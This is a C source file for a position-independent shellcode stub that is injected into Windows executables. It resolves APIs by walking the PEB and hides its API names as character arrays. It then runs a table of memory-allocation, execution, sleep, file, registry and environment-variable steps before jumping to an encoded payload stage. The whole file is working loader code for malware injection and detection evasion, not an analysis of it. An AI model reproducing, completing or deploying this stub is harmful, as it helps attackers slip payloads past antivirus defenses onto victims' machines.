/**
 * Deconditioning Stub — PIC x64 bytecode interpreter for PE injection
 *
 * Fully position-independent: no CRT, no imports, all APIs resolved via PEB walk.
 * Compiled with clang to .o, .text extracted by Rust, patched and assembled into
 * the injected section alongside the carrier stub and encoded payload.
 *
 * Layout when assembled into PE section:
 *   [decon_stub_code]      This compiled code
 *   [sequence_table]       Binary decon table (header + steps + string table)
 *   [next_stage]           VEH/carrier stub + key + payload
 *
 * The stub:
 *   1. Resolves kernel32 + advapi32 APIs via PEB walk
 *   2. Locates sequence table via sentinel LEA (0xDEC0FEED)
 *   3. Parses header, iterates steps for round_count rounds
 *   4. Dispatches 12 opcodes (VirtualAlloc, VirtualProtect, etc.)
 *   5. Falls through to next stage via sentinel JMP (0xCAFEBABE)
 *
 * Build: clang -c -O2 -nostdlib -fno-stack-protector -fno-exceptions
 *        --target=x86_64-pc-windows-msvc -fms-compatibility -fms-extensions
 *        -fno-builtin -mno-red-zone decon_stub.c
 */

/* ======================================================================
 * Minimal type definitions (no windows.h — must be PIC)
 * ====================================================================== */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned short      USHORT;
typedef unsigned int        DWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  DWORD64;
typedef long                LONG;
typedef int                 BOOL;
typedef void*               PVOID;
typedef void*               HANDLE;
typedef void*               LPVOID;
typedef const char*         LPCSTR;
typedef char*               LPSTR;
typedef unsigned long       ULONG;
typedef unsigned char       BOOLEAN;
typedef unsigned long long  SIZE_T;
typedef unsigned short      WCHAR;
typedef WCHAR*              PWSTR;

/* PEB access via GS segment — AT&T syntax, no <intrin.h> dependency.
 * x64 only: PEB is at gs:[0x60].
 *
 * ALL helpers are __attribute__((always_inline)) to guarantee they are
 * inlined into stub_entry. After compilation and .text extraction,
 * stub_entry must be the ONLY function at offset 0 — no standalone
 * helper functions that would shift it or create broken relocations. */
static __inline __attribute__((always_inline)) void* __pic_read_peb(void) {
    void* val;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(val));
    return val;
}

/* List entry for PEB walk */
typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY* Flink;
    struct _LIST_ENTRY* Blink;
} LIST_ENTRY;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG       Length;
    BOOLEAN     Initialized;
    HANDLE      SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} PEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderModuleList;
    LIST_ENTRY     InMemoryOrderModuleList;
    LIST_ENTRY     InInitializationOrderModuleList;
    void*          BaseAddress;
    void*          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN          InheritedAddressSpace;
    BOOLEAN          ReadImageFileExecOptions;
    BOOLEAN          BeingDebugged;
    BOOLEAN          SpareBool;
    HANDLE           Mutant;
    PVOID            ImageBaseAddress;
    PEB_LDR_DATA*    Ldr;
} PEB;

/* PE structures for export resolution */
typedef struct _IMAGE_DOS_HEADER {
    WORD e_magic;
    WORD e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc;
    WORD e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
    WORD e_res[4];
    WORD e_oemid, e_oeminfo;
    WORD e_res2[10];
    LONG e_lfanew;
} IMAGE_DOS_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD  Magic;
    BYTE  filler[110];  /* skip to DataDirectory at offset 0x70 in PE32+ OptHdr */
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_FILE_HEADER {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} IMAGE_FILE_HEADER;

typedef struct _IMAGE_NT_HEADERS64 {
    DWORD                  Signature;
    IMAGE_FILE_HEADER      FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD  MajorVersion;
    WORD  MinorVersion;
    DWORD Name;
    DWORD Base;
    DWORD NumberOfFunctions;
    DWORD NumberOfNames;
    DWORD AddressOfFunctions;
    DWORD AddressOfNames;
    DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;

/* Constants */
#define IMAGE_DOS_SIGNATURE     0x5A4D
#define MEM_COMMIT              0x1000
#define MEM_RESERVE             0x2000
#define MEM_RELEASE             0x8000
#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE_READ       0x20
#define PAGE_EXECUTE_READWRITE  0x40
#define GENERIC_READ            0x80000000
#define FILE_SHARE_READ         0x00000001
#define OPEN_EXISTING           3
#define FILE_ATTRIBUTE_NORMAL   0x80
#define INVALID_HANDLE_VALUE    ((HANDLE)(ULONG_PTR)-1)
#define KEY_READ                0x20019
#define ERROR_SUCCESS           0
#define INFINITE                0xFFFFFFFF

/* HKEY constants */
#define HKEY_LOCAL_MACHINE      ((HANDLE)(ULONG_PTR)0x80000002)

/* API function pointer types */
typedef LPVOID (*VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (*VirtualProtect_t)(LPVOID, SIZE_T, DWORD, DWORD*);
typedef BOOL   (*VirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef HANDLE (*CreateThread_t)(PVOID, SIZE_T, PVOID, PVOID, DWORD, DWORD*);
typedef DWORD  (*WaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL   (*CloseHandle_t)(HANDLE);
typedef HANDLE (*CreateFileA_t)(LPCSTR, DWORD, DWORD, PVOID, DWORD, DWORD, HANDLE);
typedef BOOL   (*ReadFile_t)(HANDLE, PVOID, DWORD, DWORD*, PVOID);
typedef void   (*Sleep_t)(DWORD);
typedef DWORD  (*GetEnvironmentVariableA_t)(LPCSTR, LPSTR, DWORD);

/* Advapi32 registry types */
typedef LONG   (*RegOpenKeyExA_t)(HANDLE, LPCSTR, DWORD, DWORD, HANDLE*);
typedef LONG   (*RegQueryValueExA_t)(HANDLE, LPCSTR, DWORD*, DWORD*, BYTE*, DWORD*);
typedef LONG   (*RegCloseKey_t)(HANDLE);

/* ======================================================================
 * Sequence table format (matches Rust serialization)
 * ====================================================================== */

/* Header flags */
#define DECON_FLAG_FREE_AFTER 0x01

/* Step flags */
#define STEP_USE_LAST_BUF    0x01
#define STEP_IGNORE_FAILURE  0x02
#define STEP_HAS_EXT         0x04

/* Opcodes */
#define OP_VIRTUAL_ALLOC     0
#define OP_VIRTUAL_PROTECT   1
#define OP_VIRTUAL_FREE      2
#define OP_MEMSET_FILL       3
#define OP_CALL_BUF          4
#define OP_CREATE_THREAD     5
#define OP_CREATE_FILE_READ  6
#define OP_REG_QUERY         7
#define OP_GET_ENV_VAR       8
#define OP_ENTROPY_FILL      9
#define OP_SLEEP             10
#define OP_NOP               11

/* ======================================================================
 * PEB Walk — resolve module by name
 * ====================================================================== */

static __inline __attribute__((always_inline)) WCHAR to_lower_w(WCHAR c) {
    if (c >= L'A' && c <= L'Z') return (WCHAR)(c - L'A' + L'a');
    return c;
}

static __inline __attribute__((always_inline)) LPVOID get_module_by_name(const WCHAR* module_name) {
    PEB* peb = (PEB*)__pic_read_peb();
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
    LIST_ENTRY* entry = head->Flink;

    while (entry != head) {
        LDR_DATA_TABLE_ENTRY* mod = (LDR_DATA_TABLE_ENTRY*)entry;
        if (mod->BaseAddress && mod->BaseDllName.Buffer) {
            PWSTR curr = mod->BaseDllName.Buffer;
            const WCHAR* target = module_name;
            int match = 1;
            while (*target && *curr) {
                if (to_lower_w(*target) != to_lower_w(*curr)) {
                    match = 0;
                    break;
                }
                target++;
                curr++;
            }
            if (match && *target == 0 && *curr == 0)
                return mod->BaseAddress;
        }
        entry = entry->Flink;
    }
    return 0;
}

/* ======================================================================
 * Export resolver
 * ====================================================================== */

static __inline __attribute__((always_inline)) LPVOID get_func_by_name(LPVOID module, const char* func_name) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)module + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* exp_dir = &nt->OptionalHeader.DataDirectory[0];
    if (!exp_dir->VirtualAddress) return 0;

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)module + exp_dir->VirtualAddress);
    DWORD* names    = (DWORD*)((BYTE*)module + exp->AddressOfNames);
    WORD*  ordinals = (WORD*)((BYTE*)module + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)((BYTE*)module + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)module + names[i]);
        const char* a = func_name;
        const char* b = name;
        while (*a && *b && *a == *b) { a++; b++; }
        if (*a == 0 && *b == 0)
            return (BYTE*)module + funcs[ordinals[i]];
    }
    return 0;
}

/* ======================================================================
 * xorshift32 PRNG for entropy fill
 * ====================================================================== */

/* xorshift32 PRNG — state passed by pointer (no globals, avoids .bss) */
static __inline __attribute__((always_inline)) unsigned int xorshift32(unsigned int* state) {
    unsigned int x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

/* ======================================================================
 * String table accessor
 * ====================================================================== */

static __inline __attribute__((always_inline)) const char* get_string(BYTE* table_base, DWORD str_table_offset, WORD index) {
    BYTE* st = table_base + str_table_offset;
    WORD count = *(WORD*)st;
    if (index >= count) return 0;

    /* Directory: count + index * (u16 offset, u16 length) */
    WORD* dir_entry = (WORD*)(st + 2 + index * 4);
    WORD offset = dir_entry[0];
    /* WORD length = dir_entry[1]; -- not needed, strings are null-terminated */

    /* String data starts after directory */
    DWORD dir_size = 2 + count * 4;
    return (const char*)(st + dir_size + offset);
}

/* ======================================================================
 * Decon stub entry point
 * ====================================================================== */

__attribute__((section(".text")))
void stub_entry(void) {
    /* === Resolve kernel32.dll === */
    WCHAR k32_name[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l', 0 };
    LPVOID k32 = get_module_by_name(k32_name);
    if (!k32) goto done;

    /* === Resolve advapi32.dll === */
    WCHAR adv_name[] = { L'a',L'd',L'v',L'a',L'p',L'i',L'3',L'2',L'.',L'd',L'l',L'l', 0 };
    LPVOID adv = get_module_by_name(adv_name);
    /* advapi32 may not be loaded — registry ops will be skipped if NULL */

    /* === Resolve kernel32 APIs === */
    char s_VirtualAlloc[]   = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 };
    char s_VirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0 };
    char s_VirtualFree[]    = { 'V','i','r','t','u','a','l','F','r','e','e', 0 };
    char s_CreateThread[]   = { 'C','r','e','a','t','e','T','h','r','e','a','d', 0 };
    char s_WaitForSingle[]  = { 'W','a','i','t','F','o','r','S','i','n','g','l','e',
                                'O','b','j','e','c','t', 0 };
    char s_CloseHandle[]    = { 'C','l','o','s','e','H','a','n','d','l','e', 0 };
    char s_CreateFileA[]    = { 'C','r','e','a','t','e','F','i','l','e','A', 0 };
    char s_ReadFile[]       = { 'R','e','a','d','F','i','l','e', 0 };
    char s_Sleep[]          = { 'S','l','e','e','p', 0 };
    char s_GetEnvVar[]      = { 'G','e','t','E','n','v','i','r','o','n','m','e','n','t',
                                'V','a','r','i','a','b','l','e','A', 0 };

    VirtualAlloc_t   pVirtualAlloc   = (VirtualAlloc_t)get_func_by_name(k32, s_VirtualAlloc);
    VirtualProtect_t pVirtualProtect = (VirtualProtect_t)get_func_by_name(k32, s_VirtualProtect);
    VirtualFree_t    pVirtualFree    = (VirtualFree_t)get_func_by_name(k32, s_VirtualFree);
    CreateThread_t   pCreateThread   = (CreateThread_t)get_func_by_name(k32, s_CreateThread);
    WaitForSingleObject_t pWait      = (WaitForSingleObject_t)get_func_by_name(k32, s_WaitForSingle);
    CloseHandle_t    pCloseHandle    = (CloseHandle_t)get_func_by_name(k32, s_CloseHandle);
    CreateFileA_t    pCreateFileA    = (CreateFileA_t)get_func_by_name(k32, s_CreateFileA);
    ReadFile_t       pReadFile       = (ReadFile_t)get_func_by_name(k32, s_ReadFile);
    Sleep_t          pSleep          = (Sleep_t)get_func_by_name(k32, s_Sleep);
    GetEnvironmentVariableA_t pGetEnvVar = (GetEnvironmentVariableA_t)get_func_by_name(k32, s_GetEnvVar);

    /* Core 3 must resolve or skip decon entirely */
    if (!pVirtualAlloc || !pVirtualProtect || !pVirtualFree)
        goto done;

    /* === Resolve advapi32 APIs (optional — NULL if advapi32 not loaded) === */
    RegOpenKeyExA_t    pRegOpenKeyExA    = 0;
    RegQueryValueExA_t pRegQueryValueExA = 0;
    RegCloseKey_t      pRegCloseKey      = 0;

    if (adv) {
        char s_RegOpen[]  = { 'R','e','g','O','p','e','n','K','e','y','E','x','A', 0 };
        char s_RegQuery[] = { 'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A', 0 };
        char s_RegClose[] = { 'R','e','g','C','l','o','s','e','K','e','y', 0 };

        pRegOpenKeyExA    = (RegOpenKeyExA_t)get_func_by_name(adv, s_RegOpen);
        pRegQueryValueExA = (RegQueryValueExA_t)get_func_by_name(adv, s_RegQuery);
        pRegCloseKey      = (RegCloseKey_t)get_func_by_name(adv, s_RegClose);
    }

    /* === Locate sequence table via sentinel LEA === */
    /* LEA RAX, [RIP + 0xDEC0FEED] = 48 8D 05 ED FE C0 DE
     * Raw .byte emission avoids AT&T/Intel syntax issues across clang versions.
     * Rust scans for the 4-byte sentinel pattern and patches the disp32. */
    BYTE* table_ptr;
    __asm__ volatile (
        ".byte 0x48, 0x8D, 0x05, 0xED, 0xFE, 0xC0, 0xDE\n"
        "movq %%rax, %0\n"
        : "=r"(table_ptr)
        :
        : "rax"
    );

    /* === Parse header (16 bytes) === */
    /* u16 magic, u8 version, u8 flags, u16 round_count, u16 step_count,
       u32 string_table_offset, u32 seed */
    WORD magic = *(WORD*)table_ptr;
    if (magic != 0xDEC0) goto done;

    BYTE hdr_flags    = table_ptr[3];
    WORD round_count  = *(WORD*)(table_ptr + 4);
    WORD step_count   = *(WORD*)(table_ptr + 6);
    DWORD str_offset  = *(DWORD*)(table_ptr + 8);
    DWORD seed        = *(DWORD*)(table_ptr + 12);

    /* === Interpreter state === */
    BYTE* buf_ptr   = 0;
    DWORD buf_size  = 0;
    unsigned int xor_state = 0;  /* PRNG state — local to avoid .bss global */

    /* === Main loop: round_count iterations === */
    for (WORD round = 0; round < round_count; round++) {

        /* Reset PRNG seed for each round (mix with round index) */
        xor_state = seed + round * 2654435761u;
        if (xor_state == 0) xor_state = 1;

        /* Walk step array */
        BYTE* step_ptr = table_ptr + 16; /* steps start after header */

        for (WORD s = 0; s < step_count; s++) {
            BYTE opcode    = step_ptr[0];
            BYTE sflags    = step_ptr[1];
            WORD param_a   = *(WORD*)(step_ptr + 2);
            WORD param_b   = *(WORD*)(step_ptr + 4);
            WORD param_c   = *(WORD*)(step_ptr + 6);

            /* Advance past this step */
            DWORD step_size = (sflags & STEP_HAS_EXT) ? 16 : 8;

            switch (opcode) {

            case OP_VIRTUAL_ALLOC: {
                DWORD size = param_a ? (DWORD)param_a * 256 : 4096;
                DWORD prot = param_b ? (DWORD)param_b : PAGE_READWRITE;
                LPVOID p = pVirtualAlloc(0, (SIZE_T)size, MEM_COMMIT | MEM_RESERVE, prot);
                if (p) {
                    buf_ptr = (BYTE*)p;
                    buf_size = size;
                } else if (!(sflags & STEP_IGNORE_FAILURE)) {
                    goto done;
                }
                break;
            }

            case OP_VIRTUAL_PROTECT: {
                if (buf_ptr && buf_size) {
                    DWORD new_prot = param_a ? (DWORD)param_a : PAGE_EXECUTE_READ;
                    DWORD old_prot;
                    BOOL ok = pVirtualProtect(buf_ptr, (SIZE_T)buf_size, new_prot, &old_prot);
                    if (!ok && !(sflags & STEP_IGNORE_FAILURE)) {
                        goto done;
                    }
                }
                break;
            }

            case OP_VIRTUAL_FREE: {
                if (buf_ptr) {
                    pVirtualFree(buf_ptr, 0, MEM_RELEASE);
                    buf_ptr = 0;
                    buf_size = 0;
                }
                break;
            }

            case OP_MEMSET_FILL: {
                if (buf_ptr && buf_size) {
                    BYTE fill = (BYTE)(param_a & 0xFF);
                    for (DWORD k = 0; k < buf_size; k++) {
                        buf_ptr[k] = fill;
                    }
                    /* param_b = 1 means write RET (0xC3) at last byte */
                    if (param_b == 1 && buf_size > 0) {
                        buf_ptr[buf_size - 1] = 0xC3;
                    }
                }
                break;
            }

            case OP_CALL_BUF: {
                if (buf_ptr) {
                    ((void(*)())buf_ptr)();
                }
                break;
            }

            case OP_CREATE_THREAD: {
                if (buf_ptr && pCreateThread && pWait && pCloseHandle) {
                    DWORD timeout = param_a ? (DWORD)param_a : 5000;
                    HANDLE hThread = pCreateThread(0, 0, (PVOID)buf_ptr, 0, 0, 0);
                    if (hThread) {
                        pWait(hThread, timeout);
                        pCloseHandle(hThread);
                    }
                }
                break;
            }

            case OP_CREATE_FILE_READ: {
                if (pCreateFileA && pReadFile && pCloseHandle) {
                    const char* path = get_string(table_ptr, str_offset, param_a);
                    if (path) {
                        HANDLE hFile = pCreateFileA(
                            path, GENERIC_READ, FILE_SHARE_READ,
                            0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
                        );
                        if (hFile != INVALID_HANDLE_VALUE) {
                            char read_buf[64];
                            DWORD bytes_read = 0;
                            pReadFile(hFile, read_buf, 64, &bytes_read, 0);
                            pCloseHandle(hFile);
                        }
                    }
                }
                break;
            }

            case OP_REG_QUERY: {
                if (pRegOpenKeyExA && pRegQueryValueExA && pRegCloseKey) {
                    const char* key_path  = get_string(table_ptr, str_offset, param_a);
                    const char* val_name  = get_string(table_ptr, str_offset, param_b);
                    if (key_path) {
                        HANDLE hKey = 0;
                        if (pRegOpenKeyExA(HKEY_LOCAL_MACHINE, key_path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                            if (val_name) {
                                char val_buf[128];
                                DWORD val_size = 128;
                                pRegQueryValueExA(hKey, val_name, 0, 0, (BYTE*)val_buf, &val_size);
                            }
                            pRegCloseKey(hKey);
                        }
                    }
                }
                break;
            }

            case OP_GET_ENV_VAR: {
                if (pGetEnvVar) {
                    const char* var_name = get_string(table_ptr, str_offset, param_a);
                    if (var_name) {
                        char env_buf[256];
                        pGetEnvVar(var_name, env_buf, 256);
                    }
                }
                break;
            }

            case OP_ENTROPY_FILL: {
                if (buf_ptr && buf_size) {
                    /* Seed: param_a if nonzero, else round-derived */
                    if (param_a) {
                        xor_state = (unsigned int)param_a + round;
                        if (xor_state == 0) xor_state = 1;
                    }
                    for (DWORD k = 0; k < buf_size; k++) {
                        buf_ptr[k] = (BYTE)(xorshift32(&xor_state) & 0xFF);
                    }
                }
                break;
            }

            case OP_SLEEP: {
                if (pSleep) {
                    DWORD ms = param_a ? (DWORD)param_a : 10;
                    pSleep(ms);
                }
                break;
            }

            case OP_NOP:
            default:
                break;
            }

            step_ptr += step_size;
        }

        /* Optional: free buffer at end of each round if flag set */
        if ((hdr_flags & DECON_FLAG_FREE_AFTER) && buf_ptr) {
            pVirtualFree(buf_ptr, 0, MEM_RELEASE);
            buf_ptr = 0;
            buf_size = 0;
        }
    }

done:
    /* === Jump to next stage === */
    /* JMP rel32 with displacement 0xCAFEBABE = E9 BE BA FE CA
     * Raw .byte emission avoids syntax issues. Rust patches the rel32. */
    __asm__ volatile (
        ".byte 0xE9, 0xBE, 0xBA, 0xFE, 0xCA\n"
    );

    __builtin_unreachable();
}
